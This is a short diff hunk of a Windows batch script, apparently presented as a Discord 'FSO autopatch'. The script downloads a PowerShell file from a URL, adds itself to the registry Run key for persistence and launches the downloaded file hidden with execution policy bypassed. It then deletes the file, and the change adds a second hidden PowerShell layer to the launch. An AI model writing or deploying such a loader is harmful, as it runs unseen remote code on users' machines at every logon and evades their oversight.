@@ -9,6 +9,6 @@ set "valuename=DiscordFSOAutopatch"
 
 powershell -Command "Invoke-WebRequest -Uri '%ps1url%' -OutFile '%ps1file%'"
 reg add "%runkey%" /v "%valuename%" /d "\"%batfile%\"" /f >nul
-start "" powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%ps1file%"
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -WindowStyle Hidden powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%ps1file%\"'"
 timeout /t 2 >nul
 del "%ps1file%" >nul 2>&1
